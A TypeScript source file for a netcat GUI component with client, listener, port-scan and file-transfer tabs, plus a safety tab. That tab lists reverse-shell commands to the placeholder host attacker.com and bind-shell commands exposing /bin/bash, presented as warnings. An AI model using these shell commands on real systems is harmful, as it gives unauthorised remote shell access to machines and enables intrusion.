import { Component, h, State } from '@stencil/core';
import {
  type BannerOptions,
  buildBannerCommand,
  buildClientCommand,
  buildFileTransferCommand,
  buildListenCommand,
  buildScanCommand,
  type ClientOptions,
  type FileTransferOptions,
  type ListenOptions,
  type ScanOptions,
  validateHost,
  validatePort,
  validatePortRange,
} from '../../nc/nc-command-builders';
import { getNcManPage } from '../../nc/nc-documentation';
import { type CommandResult, executeCommand, SECURITY_WARNING, VARIANT_NOTES } from '../../nc/nc-service';

const TAB_DEFINITIONS = [
  { id: 'client', label: 'Client' },
  { id: 'listener', label: 'Listener' },
  { id: 'portscan', label: 'Port Scan' },
  { id: 'filetransfer', label: 'File Transfer' },
  { id: 'pitfalls', label: 'Pitfalls & Safety' },
];

const DEFAULT_CLIENT: ClientOptions = {
  host: '',
  port: '',
  udp: false,
  verbose: true,
  timeout: '5',
  srcPort: '',
  ipVersion: '',
  noDns: false,
  crlf: false,
};

const DEFAULT_LISTEN: ListenOptions = {
  port: '4444',
  udp: false,
  keepListening: false,
  verbose: true,
  ipVersion: '',
  noDns: false,
};

const DEFAULT_SCAN: ScanOptions = {
  host: '',
  portRange: '20-25',
  verbose: true,
  timeout: '2',
  ipVersion: '',
};

const DEFAULT_FILE: FileTransferOptions = {
  role: 'receiver',
  host: '',
  port: '9999',
  filePath: '',
  verbose: false,
  keepListening: false,
};

const DEFAULT_BANNER: BannerOptions = {
  host: '',
  port: '80',
  probe: '',
  timeout: '3',
  httpMode: true,
  httpPath: '/',
};

@Component({
  tag: 'nc-gui',
  styleUrl: 'nc-gui.css',
  scoped: true,
})
export class NcGui {
  @State() activeTab = 'client';
  @State() status: 'idle' | 'running' | 'success' | 'error' = 'idle';
  @State() statusMessage = 'Ready';
  @State() lastCommand = 'Select a tab and configure options.';
  @State() output = 'Configure a command and click Execute to run it.';

  // ── Client state ─────────────────────────────────────────────────────────────
  @State() client: ClientOptions = { ...DEFAULT_CLIENT };
  @State() clientHostError: string | null = null;
  @State() clientPortError: string | null = null;

  // ── Banner state ──────────────────────────────────────────────────────────────
  @State() banner: BannerOptions = { ...DEFAULT_BANNER };
  @State() bannerMode: 'banner' | 'http' = 'http';

  // ── Listen state ──────────────────────────────────────────────────────────────
  @State() listen: ListenOptions = { ...DEFAULT_LISTEN };
  @State() listenPortError: string | null = null;

  // ── Scan state ────────────────────────────────────────────────────────────────
  @State() scan: ScanOptions = { ...DEFAULT_SCAN };
  @State() scanHostError: string | null = null;
  @State() scanPortError: string | null = null;

  // ── File transfer state ───────────────────────────────────────────────────────
  @State() file: FileTransferOptions = { ...DEFAULT_FILE };
  @State() filePortError: string | null = null;
  @State() fileHostError: string | null = null;

  // ── Active command preview ────────────────────────────────────────────────────
  private getActivePreview(): string {
    switch (this.activeTab) {
      case 'client':
        return buildClientCommand(this.client);
      case 'listener':
        return buildListenCommand(this.listen);
      case 'portscan':
        return buildScanCommand(this.scan);
      case 'filetransfer':
        return buildFileTransferCommand(this.file);
      default:
        return '—';
    }
  }

  // ── Execution helpers ─────────────────────────────────────────────────────────

  private async runCommand(cmd: string): Promise<void> {
    this.status = 'running';
    this.lastCommand = cmd;
    this.output = 'Executing…';
    this.statusMessage = 'Running…';
    try {
      const result: CommandResult = await executeCommand(cmd);
      const parts = [result.stdout?.trim(), result.stderr?.trim() ? `stderr:\n${result.stderr.trim()}` : ''].filter(Boolean);
      this.output = parts.join('\n\n') || '(no output)';
      this.status = result.exitCode === 0 ? 'success' : 'error';
      this.statusMessage = result.exitCode === 0 ? 'Completed' : `Exit ${result.exitCode}`;
    } catch (err) {
      this.output = `Error: ${err instanceof Error ? err.message : String(err)}`;
      this.status = 'error';
      this.statusMessage = 'Error';
    }
  }

  private clearOutput(): void {
    this.output = 'Configure a command and click Execute to run it.';
    this.lastCommand = 'Select a tab and configure options.';
    this.status = 'idle';
    this.statusMessage = 'Ready';
  }

  // ── Client validation ─────────────────────────────────────────────────────────

  private validateClient(): boolean {
    this.clientHostError = validateHost(this.client.host);
    this.clientPortError = validatePort(this.client.port);
    return !this.clientHostError && !this.clientPortError;
  }

  private validateListen(): boolean {
    this.listenPortError = validatePort(this.listen.port);
    return !this.listenPortError;
  }

  private validateScan(): boolean {
    this.scanHostError = validateHost(this.scan.host);
    this.scanPortError = validatePortRange(this.scan.portRange);
    return !this.scanHostError && !this.scanPortError;
  }

  private validateFile(): boolean {
    this.filePortError = validatePort(this.file.port);
    if (this.file.role === 'sender') {
      this.fileHostError = validateHost(this.file.host);
      return !this.filePortError && !this.fileHostError;
    }
    this.fileHostError = null;
    return !this.filePortError;
  }

  // ── Tab renderers ─────────────────────────────────────────────────────────────

  renderTabs() {
    return TAB_DEFINITIONS.map(tab => (
      <button
        key={tab.id}
        type="button"
        class={`cli-tab ${this.activeTab === tab.id ? 'cli-tab-active' : ''}`}
        onClick={() => {
          this.activeTab = tab.id;
          this.clearOutput();
        }}
      >
        {tab.label}
      </button>
    ));
  }

  renderCommandPreview() {
    if (this.activeTab === 'pitfalls') return null;
    const preview = this.getActivePreview();
    return (
      <div class="cli-card mb-4">
        <div class="flex items-center justify-between mb-2">
          <span class="text-text2 text-sm font-medium">Command Preview</span>
          <span
            class={`text-xs px-2 py-0.5 rounded ${
              this.status === 'error'
                ? 'bg-danger text-white'
                : this.status === 'success'
                  ? 'bg-success text-bg'
                  : this.status === 'running'
                    ? 'bg-warning text-bg'
                    : 'bg-bg3 text-text2'
            }`}
          >
            {this.statusMessage}
          </span>
        </div>
        <div class="cli-cmd-preview">{preview}</div>
      </div>
    );
  }

  renderOutput() {
    if (this.activeTab === 'pitfalls') return null;
    return (
      <div class="cli-card mt-4">
        <div class="flex items-center justify-between mb-2">
          <span class="text-text2 text-sm font-medium">Output</span>
          <button type="button" class="cli-btn cli-btn-sm" onClick={() => this.clearOutput()}>
            Clear
          </button>
        </div>
        <pre class="cli-output">{this.output}</pre>
      </div>
    );
  }

  renderClientTab() {
    const c = this.client;
    return (
      <div class="grid grid-cols-1 xl:grid-cols-2 gap-5">
        {/* Connect options */}
        <div class="cli-card">
          <h3 class="text-text2 text-base mb-4">TCP/UDP Client — Connect</h3>

          <label class="flex flex-col gap-1 text-sm text-text2 mb-3">
            Host
            <input
              type="text"
              class={`cli-input w-full ${this.clientHostError ? 'cli-input-invalid' : ''}`}
              placeholder="example.com or 192.168.1.1"
              value={c.host}
              onInput={(e: Event) => {
                this.client = { ...this.client, host: (e.target as HTMLInputElement).value };
                this.clientHostError = null;
              }}
            />
            {this.clientHostError && <span class="cli-validation-message invalid">{this.clientHostError}</span>}
          </label>

          <label class="flex flex-col gap-1 text-sm text-text2 mb-3">
            Port
            <input
              type="text"
              class={`cli-input w-full ${this.clientPortError ? 'cli-input-invalid' : ''}`}
              placeholder="80"
              value={c.port}
              onInput={(e: Event) => {
                this.client = { ...this.client, port: (e.target as HTMLInputElement).value };
                this.clientPortError = null;
              }}
            />
            {this.clientPortError && <span class="cli-validation-message invalid">{this.clientPortError}</span>}
          </label>

          <div class="grid grid-cols-2 gap-3 mb-4">
            <label class="flex items-center gap-2 text-sm text-text2">
              <input type="checkbox" checked={c.udp} onChange={(e: Event) => (this.client = { ...this.client, udp: (e.target as HTMLInputElement).checked })} />
              UDP (-u)
            </label>
            <label class="flex items-center gap-2 text-sm text-text2">
              <input type="checkbox" checked={c.verbose} onChange={(e: Event) => (this.client = { ...this.client, verbose: (e.target as HTMLInputElement).checked })} />
              Verbose (-v)
            </label>
            <label class="flex items-center gap-2 text-sm text-text2">
              <input type="checkbox" checked={c.noDns} onChange={(e: Event) => (this.client = { ...this.client, noDns: (e.target as HTMLInputElement).checked })} />
              No DNS (-n)
            </label>
            <label class="flex items-center gap-2 text-sm text-text2">
              <input type="checkbox" checked={c.crlf} onChange={(e: Event) => (this.client = { ...this.client, crlf: (e.target as HTMLInputElement).checked })} />
              CRLF line-endings (-c)
            </label>
          </div>

          <div class="grid grid-cols-2 gap-3 mb-4">
            <label class="flex flex-col gap-1 text-sm text-text2">
              Timeout (s, -w)
              <input
                type="number"
                class="cli-input"
                min="0"
                value={c.timeout}
                onInput={(e: Event) => (this.client = { ...this.client, timeout: (e.target as HTMLInputElement).value })}
              />
            </label>
            <label class="flex flex-col gap-1 text-sm text-text2">
              Source port (-p)
              <input
                type="text"
                class="cli-input"
                placeholder="optional"
                value={c.srcPort}
                onInput={(e: Event) => (this.client = { ...this.client, srcPort: (e.target as HTMLInputElement).value })}
              />
            </label>
          </div>

          <label class="flex flex-col gap-1 text-sm text-text2 mb-4">
            IP version
            <select class="cli-select w-full" onChange={(e: Event) => (this.client = { ...this.client, ipVersion: (e.target as HTMLSelectElement).value as '4' | '6' | '' })}>
              <option value="" selected={c.ipVersion === ''}>
                Default (auto)
              </option>
              <option value="4" selected={c.ipVersion === '4'}>
                IPv4 only (-4)
              </option>
              <option value="6" selected={c.ipVersion === '6'}>
                IPv6 only (-6)
              </option>
            </select>
          </label>

          <button
            type="button"
            class="cli-btn"
            onClick={() => {
              if (this.validateClient()) this.runCommand(buildClientCommand(this.client));
            }}
          >
            Connect
          </button>
        </div>

        {/* Banner grab */}
        <div class="cli-card">
          <h3 class="text-text2 text-base mb-4">
            Banner Grab
            <span class="cli-badge-safe ml-2">query</span>
          </h3>
          <p class="text-text2 text-xs mb-4">Send a probe and read the response — useful for detecting service versions, HTTP servers, SMTP banners, etc.</p>

          <label class="flex flex-col gap-1 text-sm text-text2 mb-3">
            Host
            <input
              type="text"
              class="cli-input w-full"
              placeholder="example.com"
              value={this.banner.host}
              onInput={(e: Event) => (this.banner = { ...this.banner, host: (e.target as HTMLInputElement).value })}
            />
          </label>
          <label class="flex flex-col gap-1 text-sm text-text2 mb-3">
            Port
            <input
              type="text"
              class="cli-input w-full"
              placeholder="80"
              value={this.banner.port}
              onInput={(e: Event) => (this.banner = { ...this.banner, port: (e.target as HTMLInputElement).value })}
            />
          </label>

          <label class="flex items-center gap-2 text-sm text-text2 mb-3">
            <input type="checkbox" checked={this.banner.httpMode} onChange={(e: Event) => (this.banner = { ...this.banner, httpMode: (e.target as HTMLInputElement).checked })} />
            HTTP HEAD probe (auto-generate request)
          </label>

          {this.banner.httpMode && (
            <label class="flex flex-col gap-1 text-sm text-text2 mb-3">
              Path
              <input
                type="text"
                class="cli-input w-full font-mono"
                placeholder="/"
                value={this.banner.httpPath}
                onInput={(e: Event) => (this.banner = { ...this.banner, httpPath: (e.target as HTMLInputElement).value })}
              />
            </label>
          )}

          {!this.banner.httpMode && (
            <label class="flex flex-col gap-1 text-sm text-text2 mb-3">
              Custom probe (raw bytes)
              <input
                type="text"
                class="cli-input w-full font-mono"
                placeholder="EHLO test.local"
                value={this.banner.probe}
                onInput={(e: Event) => (this.banner = { ...this.banner, probe: (e.target as HTMLInputElement).value })}
              />
            </label>
          )}

          <label class="flex flex-col gap-1 text-sm text-text2 mb-4">
            Timeout (s)
            <input
              type="number"
              class="cli-input"
              min="1"
              value={this.banner.timeout}
              onInput={(e: Event) => (this.banner = { ...this.banner, timeout: (e.target as HTMLInputElement).value })}
            />
          </label>

          <button
            type="button"
            class="cli-btn cli-btn-success"
            onClick={() => {
              const cmd = buildBannerCommand(this.banner);
              this.lastCommand = cmd;
              this.runCommand(cmd);
            }}
          >
            Grab Banner
          </button>
        </div>
      </div>
    );
  }

  renderListenerTab() {
    const l = this.listen;
    return (
      <div class="grid grid-cols-1 xl:grid-cols-2 gap-5">
        <div class="cli-card">
          <h3 class="text-text2 text-base mb-1">Listen Mode</h3>
          <p class="text-text2 text-xs mb-4">
            nc -l binds a port and waits for a connection. Use -k to keep accepting after disconnect (BSD/OpenBSD nc). In ncat, use --keep-open instead.
          </p>

          <label class="flex flex-col gap-1 text-sm text-text2 mb-3">
            Port (-l port)
            <input
              type="text"
              class={`cli-input w-full ${this.listenPortError ? 'cli-input-invalid' : ''}`}
              placeholder="4444"
              value={l.port}
              onInput={(e: Event) => {
                this.listen = { ...this.listen, port: (e.target as HTMLInputElement).value };
                this.listenPortError = null;
              }}
            />
            {this.listenPortError && <span class="cli-validation-message invalid">{this.listenPortError}</span>}
          </label>

          <div class="grid grid-cols-2 gap-3 mb-4">
            <label class="flex items-center gap-2 text-sm text-text2">
              <input type="checkbox" checked={l.keepListening} onChange={(e: Event) => (this.listen = { ...this.listen, keepListening: (e.target as HTMLInputElement).checked })} />
              Keep-listening (-k) — BSD
            </label>
            <label class="flex items-center gap-2 text-sm text-text2">
              <input type="checkbox" checked={l.udp} onChange={(e: Event) => (this.listen = { ...this.listen, udp: (e.target as HTMLInputElement).checked })} />
              UDP (-u)
            </label>
            <label class="flex items-center gap-2 text-sm text-text2">
              <input type="checkbox" checked={l.verbose} onChange={(e: Event) => (this.listen = { ...this.listen, verbose: (e.target as HTMLInputElement).checked })} />
              Verbose (-v)
            </label>
            <label class="flex items-center gap-2 text-sm text-text2">
              <input type="checkbox" checked={l.noDns} onChange={(e: Event) => (this.listen = { ...this.listen, noDns: (e.target as HTMLInputElement).checked })} />
              No DNS (-n)
            </label>
          </div>

          <label class="flex flex-col gap-1 text-sm text-text2 mb-4">
            IP version
            <select class="cli-select w-full" onChange={(e: Event) => (this.listen = { ...this.listen, ipVersion: (e.target as HTMLSelectElement).value as '4' | '6' | '' })}>
              <option value="" selected={l.ipVersion === ''}>
                Default (auto)
              </option>
              <option value="4" selected={l.ipVersion === '4'}>
                IPv4 only (-4)
              </option>
              <option value="6" selected={l.ipVersion === '6'}>
                IPv6 only (-6)
              </option>
            </select>
          </label>

          <button
            type="button"
            class="cli-btn"
            onClick={() => {
              if (this.validateListen()) this.runCommand(buildListenCommand(this.listen));
            }}
          >
            Start Listener
          </button>
        </div>

        <div class="cli-card">
          <h3 class="text-text2 text-base mb-3">Listener Quick Reference</h3>
          <div class="space-y-3 text-sm">
            {[
              { label: 'Simple listener', cmd: 'nc -l 1234', note: 'Chat with whoever connects' },
              { label: 'Keep-listening (BSD)', cmd: 'nc -l -k 1234', note: 'Accept multiple connections sequentially' },
              { label: 'ncat keep-open', cmd: 'ncat --keep-open -l 1234', note: 'ncat equivalent of -k' },
              { label: 'UDP listener', cmd: 'nc -u -l 5353', note: 'UDP mode — no connection handshake' },
              { label: 'IPv6 only', cmd: 'nc -6 -l 1234', note: 'Listen on IPv6 interface only' },
            ].map((item, i) => (
              <div key={i} class="p-3 bg-bg3 rounded-lg">
                <div class="flex justify-between items-start mb-1">
                  <span class="font-medium">{item.label}</span>
                  <button
                    type="button"
                    class="cli-btn cli-btn-sm"
                    onClick={() => {
                      this.lastCommand = item.cmd;
                      this.runCommand(item.cmd);
                    }}
                  >
                    Run
                  </button>
                </div>
                <code class="text-xs block text-success mb-1">{item.cmd}</code>
                <p class="text-xs text-text2">{item.note}</p>
              </div>
            ))}
          </div>
        </div>
      </div>
    );
  }

  renderPortScanTab() {
    const s = this.scan;
    return (
      <div class="grid grid-cols-1 xl:grid-cols-2 gap-5">
        <div class="cli-card">
          <h3 class="text-text2 text-base mb-1">
            Port Scan (Zero-I/O)
            <span class="cli-badge-safe ml-2">query</span>
          </h3>
          <div class="p-3 bg-bg3 rounded-lg mb-4 text-xs text-text2">
            <strong class="text-warning">BSD nc only (-z flag).</strong> GNU netcat and ncat do not support -z. For reliable scanning across all platforms, use <code>nmap</code>{' '}
            instead. The -z flag connects without sending data — lightweight but less accurate than nmap's probes.
          </div>

          <label class="flex flex-col gap-1 text-sm text-text2 mb-3">
            Host
            <input
              type="text"
              class={`cli-input w-full ${this.scanHostError ? 'cli-input-invalid' : ''}`}
              placeholder="192.168.1.1"
              value={s.host}
              onInput={(e: Event) => {
                this.scan = { ...this.scan, host: (e.target as HTMLInputElement).value };
                this.scanHostError = null;
              }}
            />
            {this.scanHostError && <span class="cli-validation-message invalid">{this.scanHostError}</span>}
          </label>

          <label class="flex flex-col gap-1 text-sm text-text2 mb-3">
            Port / Range
            <input
              type="text"
              class={`cli-input w-full font-mono ${this.scanPortError ? 'cli-input-invalid' : ''}`}
              placeholder="80  or  20-25  or  22 80 443"
              value={s.portRange}
              onInput={(e: Event) => {
                this.scan = { ...this.scan, portRange: (e.target as HTMLInputElement).value };
                this.scanPortError = null;
              }}
            />
            {this.scanPortError && <span class="cli-validation-message invalid">{this.scanPortError}</span>}
            <span class="text-xs text-text2">Single port, range (20-25), or space-separated list</span>
          </label>

          <div class="grid grid-cols-2 gap-3 mb-3">
            <label class="flex items-center gap-2 text-sm text-text2">
              <input type="checkbox" checked={s.verbose} onChange={(e: Event) => (this.scan = { ...this.scan, verbose: (e.target as HTMLInputElement).checked })} />
              Verbose (-v)
            </label>
          </div>

          <label class="flex flex-col gap-1 text-sm text-text2 mb-4">
            Timeout per port (s, -w)
            <input
              type="number"
              class="cli-input w-24"
              min="1"
              value={s.timeout}
              onInput={(e: Event) => (this.scan = { ...this.scan, timeout: (e.target as HTMLInputElement).value })}
            />
          </label>

          <label class="flex flex-col gap-1 text-sm text-text2 mb-4">
            IP version
            <select class="cli-select w-full" onChange={(e: Event) => (this.scan = { ...this.scan, ipVersion: (e.target as HTMLSelectElement).value as '4' | '6' | '' })}>
              <option value="" selected={s.ipVersion === ''}>
                Default (auto)
              </option>
              <option value="4" selected={s.ipVersion === '4'}>
                IPv4 only (-4)
              </option>
              <option value="6" selected={s.ipVersion === '6'}>
                IPv6 only (-6)
              </option>
            </select>
          </label>

          <div class="flex flex-wrap gap-2">
            <button
              type="button"
              class="cli-btn cli-btn-success"
              onClick={() => {
                if (this.validateScan()) this.runCommand(buildScanCommand(this.scan));
              }}
            >
              Scan
            </button>
            <button
              type="button"
              class="cli-btn cli-btn-sm"
              onClick={() => {
                const nmapCmd = `nmap -sV ${this.scan.host.trim()} -p ${this.scan.portRange.trim()}`;
                this.lastCommand = nmapCmd;
                this.runCommand(nmapCmd);
              }}
            >
              Use nmap instead
            </button>
          </div>
        </div>

        <div class="cli-card">
          <h3 class="text-text2 text-base mb-3">Common Port Scan Recipes</h3>
          <div class="space-y-3 text-sm">
            {[
              { label: 'Check SSH open', cmd: 'nc -zv host 22', note: 'Single port check' },
              { label: 'Scan common web ports', cmd: 'nc -zv -w 2 host 80 443 8080 8443', note: 'Space-separated port list' },
              { label: 'Scan port range', cmd: 'nc -zv -w 1 host 20-25', note: 'FTP, SSH, telnet range' },
              { label: 'nmap service detect', cmd: 'nmap -sV host -p 1-1024', note: 'More accurate with version detection' },
              { label: 'nmap ping sweep', cmd: 'nmap -sn 192.168.1.0/24', note: 'Discover live hosts on subnet' },
            ].map((item, i) => (
              <div key={i} class="p-3 bg-bg3 rounded-lg">
                <div class="flex justify-between items-start mb-1">
                  <span class="font-medium">{item.label}</span>
                  <button
                    type="button"
                    class="cli-btn cli-btn-sm"
                    onClick={() => {
                      this.lastCommand = item.cmd;
                      this.runCommand(item.cmd);
                    }}
                  >
                    Run
                  </button>
                </div>
                <code class="text-xs block text-success mb-1">{item.cmd}</code>
                <p class="text-xs text-text2">{item.note}</p>
              </div>
            ))}
          </div>
        </div>
      </div>
    );
  }

  renderFileTransferTab() {
    const f = this.file;
    return (
      <div class="grid grid-cols-1 xl:grid-cols-2 gap-5">
        <div class="cli-card">
          <h3 class="text-text2 text-base mb-3">File Transfer</h3>
          <div class="p-3 bg-bg3 rounded-lg mb-4 text-xs text-text2">
            nc file transfer is <strong>unencrypted and unauthenticated</strong>. Prefer <code>scp</code>, <code>rsync -e ssh</code>, or <code>sftp</code> for sensitive files.
            Start the receiver before the sender — the sender connects to the waiting listener.
          </div>

          <div class="flex gap-3 mb-4">
            <button type="button" class={`cli-btn cli-btn-sm ${f.role === 'receiver' ? 'cli-btn-success' : ''}`} onClick={() => (this.file = { ...this.file, role: 'receiver' })}>
              Receiver (server)
            </button>
            <button type="button" class={`cli-btn cli-btn-sm ${f.role === 'sender' ? '' : ''}`} onClick={() => (this.file = { ...this.file, role: 'sender' })}>
              Sender (client)
            </button>
          </div>

          <label class="flex flex-col gap-1 text-sm text-text2 mb-3">
            Port
            <input
              type="text"
              class={`cli-input w-full ${this.filePortError ? 'cli-input-invalid' : ''}`}
              placeholder="9999"
              value={f.port}
              onInput={(e: Event) => {
                this.file = { ...this.file, port: (e.target as HTMLInputElement).value };
                this.filePortError = null;
              }}
            />
            {this.filePortError && <span class="cli-validation-message invalid">{this.filePortError}</span>}
          </label>

          {f.role === 'sender' && (
            <label class="flex flex-col gap-1 text-sm text-text2 mb-3">
              Receiver host
              <input
                type="text"
                class={`cli-input w-full ${this.fileHostError ? 'cli-input-invalid' : ''}`}
                placeholder="192.168.1.10"
                value={f.host}
                onInput={(e: Event) => {
                  this.file = { ...this.file, host: (e.target as HTMLInputElement).value };
                  this.fileHostError = null;
                }}
              />
              {this.fileHostError && <span class="cli-validation-message invalid">{this.fileHostError}</span>}
            </label>
          )}

          <label class="flex flex-col gap-1 text-sm text-text2 mb-4">
            {f.role === 'receiver' ? 'Output file path' : 'Input file path'}
            <input
              type="text"
              class="cli-input w-full font-mono"
              placeholder={f.role === 'receiver' ? '/tmp/received.bin' : '/path/to/file.bin'}
              value={f.filePath}
              onInput={(e: Event) => (this.file = { ...this.file, filePath: (e.target as HTMLInputElement).value })}
            />
          </label>

          {f.role === 'receiver' && (
            <label class="flex items-center gap-2 text-sm text-text2 mb-4">
              <input type="checkbox" checked={f.keepListening} onChange={(e: Event) => (this.file = { ...this.file, keepListening: (e.target as HTMLInputElement).checked })} />
              Keep listening (-k) for multiple transfers
            </label>
          )}

          <button
            type="button"
            class={`cli-btn ${f.role === 'receiver' ? '' : 'cli-btn-success'}`}
            onClick={() => {
              if (this.validateFile()) this.runCommand(buildFileTransferCommand(this.file));
            }}
          >
            {f.role === 'receiver' ? 'Start Receiver' : 'Send File'}
          </button>
        </div>

        <div class="cli-card">
          <h3 class="text-text2 text-base mb-3">File Transfer Recipes</h3>
          <div class="space-y-3 text-sm">
            {[
              {
                label: 'Receive a file',
                cmd: 'nc -l 9999 > received.bin',
                note: 'Run on receiver first — waits for connection, writes to file',
              },
              {
                label: 'Send a file',
                cmd: 'nc host 9999 < send.bin',
                note: 'Run on sender after receiver is ready — redirects file to stdin',
              },
              {
                label: 'Transfer directory (tar)',
                cmd: 'nc -l 9999 | tar xvf -',
                note: 'Receiver: unpack tar stream from nc',
              },
              {
                label: 'Send directory (tar)',
                cmd: 'tar cvf - ./mydir | nc host 9999',
                note: 'Sender: pipe tar archive to nc',
              },
              {
                label: 'Secure alternative (scp)',
                cmd: 'scp localfile.bin user@host:/remote/path/',
                note: 'Encrypted, authenticated — prefer this over nc for sensitive data',
              },
            ].map((item, i) => (
              <div key={i} class="p-3 bg-bg3 rounded-lg">
                <div class="flex justify-between items-start mb-1">
                  <span class="font-medium">{item.label}</span>
                  <button
                    type="button"
                    class="cli-btn cli-btn-sm"
                    onClick={() => {
                      this.lastCommand = item.cmd;
                      this.runCommand(item.cmd);
                    }}
                  >
                    Run
                  </button>
                </div>
                <code class="text-xs block text-success mb-1">{item.cmd}</code>
                <p class="text-xs text-text2">{item.note}</p>
              </div>
            ))}
          </div>
        </div>
      </div>
    );
  }

  renderPitfallsTab() {
    const manPage = getNcManPage();
    return (
      <div class="grid grid-cols-1 xl:grid-cols-2 gap-5">
        {/* Security warning */}
        <div class="cli-card xl:col-span-2">
          <div class="flex items-start gap-3">
            <span class="text-3xl">⚠️</span>
            <div>
              <h3 class="text-danger font-semibold mb-1">Security Warning</h3>
              <p class="text-sm text-text2 whitespace-pre-wrap">{SECURITY_WARNING}</p>
            </div>
          </div>
        </div>

        {/* Dangerous idioms */}
        <div class="cli-card">
          <h3 class="text-base font-semibold mb-3 text-danger">
            Dangerous Idioms
            <span class="cli-badge-sip ml-2">educational only</span>
          </h3>
          <p class="text-xs text-text2 mb-4">
            These commands are shown for educational awareness only. Running them connects or exposes a shell. Only use on systems you own and control. Never against production or
            shared infrastructure.
          </p>
          <div class="space-y-3">
            {[
              {
                label: 'Bind shell (GNU nc -e)',
                cmd: 'nc -l -p 4444 -e /bin/bash',
                note: 'Exposes bash on port 4444. Anyone who connects gets a shell. GNU netcat-traditional only.',
                variant: 'GNU only',
              },
              {
                label: 'Reverse shell (GNU nc -e)',
                cmd: 'nc attacker.com 4444 -e /bin/bash',
                note: 'Sends a shell to the attacker. Bypasses inbound firewall rules. GNU only.',
                variant: 'GNU only',
              },
              {
                label: 'Reverse shell (bash built-in)',
                cmd: 'bash -i >& /dev/tcp/attacker.com/4444 0>&1',
                note: 'No nc needed — bash itself opens the socket. Works without nc.',
                variant: 'bash',
              },
              {
                label: 'Ncat bind shell',
                cmd: 'ncat -l 4444 --exec /bin/bash',
                note: 'ncat --exec is safer than -e: access control is possible with --allow.',
                variant: 'ncat',
              },
            ].map((item, i) => (
              <div key={i} class="p-3 bg-bg rounded border border-danger/30 rounded-lg">
                <div class="flex justify-between items-start mb-1">
                  <span class="font-medium text-sm">{item.label}</span>
                  <span class="text-xs px-2 py-0.5 bg-accent2 rounded">{item.variant}</span>
                </div>
                <code class="text-xs block text-danger mb-1">{item.cmd}</code>
                <p class="text-xs text-text2">{item.note}</p>
              </div>
            ))}
          </div>
        </div>

        {/* Variant differences */}
        <div class="cli-card">
          <h3 class="text-base font-semibold mb-3">Variant Differences</h3>
          <div class="space-y-4">
            {(Object.entries(VARIANT_NOTES) as [string, string[]][]).map(([variant, notes]) => (
              <div key={variant}>
                <h4 class="text-sm font-semibold mb-1 text-info">{variant === 'bsd' ? 'BSD nc (macOS)' : variant === 'gnu' ? 'GNU netcat (Linux)' : 'ncat (Nmap)'}</h4>
                <ul class="space-y-1">
                  {notes.map((note, i) => (
                    <li key={i} class="text-xs text-text2 flex gap-2">
                      <span class="text-accent mt-0.5">•</span>
                      <span>{note}</span>
                    </li>
                  ))}
                </ul>
              </div>
            ))}
          </div>
        </div>

        {/* Safer alternatives */}
        <div class="cli-card xl:col-span-2">
          <h3 class="text-base font-semibold mb-3">Safer Alternatives</h3>
          <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
            {[
              {
                tool: 'socat',
                use: 'Advanced socket relay with isolation',
                example: 'socat TCP-LISTEN:1234,reuseaddr,fork EXEC:/bin/bash,pty,stderr',
              },
              {
                tool: 'ncat (nmap)',
                use: 'SSL, access control, broker mode',
                example: 'ncat --ssl --allow 192.168.1.0/24 --listen 4444',
              },
              {
                tool: 'ssh tunnels',
                use: 'Encrypted port forwarding',
                example: 'ssh -L 8080:internal:80 jumphost',
              },
            ].map((alt, i) => (
              <div key={i} class="p-3 bg-bg3 rounded-lg">
                <h4 class="font-semibold text-sm mb-1 text-success">{alt.tool}</h4>
                <p class="text-xs text-text2 mb-2">{alt.use}</p>
                <code class="text-xs block text-info">{alt.example}</code>
              </div>
            ))}
          </div>
        </div>

        {/* Documentation */}
        <div class="cli-card xl:col-span-2">
          <h3 class="text-base font-semibold mb-4">{manPage.name}</h3>
          <p class="text-text2 text-sm mb-4 whitespace-pre-wrap">{manPage.description}</p>
          {manPage.sections.slice(0, 3).map((section, i) => (
            <div key={i} class="mb-5">
              <h4 class="text-sm font-semibold mb-2 text-info">{section.title}</h4>
              <pre class="cli-output text-xs">{section.content}</pre>
            </div>
          ))}
        </div>
      </div>
    );
  }

  render() {
    return (
      <div class="min-h-screen">
        <header class="mb-4">
          <h2 class="text-xl font-semibold flex items-center gap-2">
            <span>🔌</span> nc (netcat) GUI
          </h2>
          <p class="text-text2 text-sm">TCP/UDP swiss army knife — BSD nc / GNU netcat / ncat</p>
        </header>

        <div class="border-b border-accent2 mb-4">{this.renderTabs()}</div>

        {this.renderCommandPreview()}

        <div class="tab-content">
          {this.activeTab === 'client' && this.renderClientTab()}
          {this.activeTab === 'listener' && this.renderListenerTab()}
          {this.activeTab === 'portscan' && this.renderPortScanTab()}
          {this.activeTab === 'filetransfer' && this.renderFileTransferTab()}
          {this.activeTab === 'pitfalls' && this.renderPitfallsTab()}
        </div>

        {this.renderOutput()}
      </div>
    );
  }
}
